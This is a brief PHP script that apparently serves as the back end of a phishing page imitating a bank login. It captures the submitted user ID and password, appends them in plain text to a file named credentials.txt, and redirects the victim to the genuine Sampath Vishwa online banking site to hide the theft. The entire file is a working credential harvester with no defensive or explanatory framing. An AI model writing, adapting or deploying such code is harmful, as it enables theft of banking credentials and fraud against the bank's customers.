<?php
	//Extract the credentials received
	$username=$_POST["txtUserId"];
	$password=$_POST["txtPassword"];
	
	//Write the credentials to the text file
	$myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
	$txt = "USERNAME = $username , PASSWORD = $password\n";
	fwrite($myfile, "\n". $txt);
	fclose($myfile);
	
	//redirect the browser to orginal login page 
	header("Location:https://www.sampathvishwa.com/SVRClientWeb/ActionController");
 	exit();	


?>
